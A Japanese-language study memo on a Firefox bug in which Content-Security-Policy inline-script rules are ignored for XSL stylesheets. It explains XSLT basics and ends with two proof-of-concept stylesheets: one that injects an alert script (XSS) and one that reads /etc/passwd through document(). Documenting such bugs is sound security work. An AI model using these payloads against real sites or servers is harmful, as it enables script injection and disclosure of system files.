# Content-Security-Policy inline script execution is bypassed on XSL pages

XSLのページでは、CSPの inline script ルールが無視される問題。

https://bugzilla.mozilla.org/show_bug.cgi?id=1597645



XMLファイルがCSPとともに提供され、XMLファイルにXSLスタイルシートが含まれている場合、
コンテンツセキュリティポリシーはXSLスタイルシートのコンテンツには適用されません。

たとえば、XSLシートにJavaScriptが含まれている場合、XMLドキュメントに適用されているコンテンツセキュリティポリシーの制限はすべて無視されます。

XSL (XSLT)は、XMLデータを表示するために必要である
「XMLのデータの構造を、（Webブラウザなどの）フォーマッタが受け付けるオブジェクトへと、構造変換する処理」のみを抽出した独立した規格。
（要するにXMLをブラウザで表示するためのモジュール？）


XSLTでは、スタイルシート自体をXMLのタグを使って書く。
また、XSLTの名前空間に属する要素を XSLT の命令として使用する。

XSLTの名前空間に属する属性の一例が以下

```
xsl:stylesheet
xsl:template
xsl:apply-templates
xsl::value-of
```


`xsl:stylesheet`
```xml
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" >
  ……
</xsl:stylesheet>
```

## PoC 例

XSS
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <script>alert(123)</script>
  </xsl:template>
</xsl:stylesheet>
```

LFI
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('/etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```
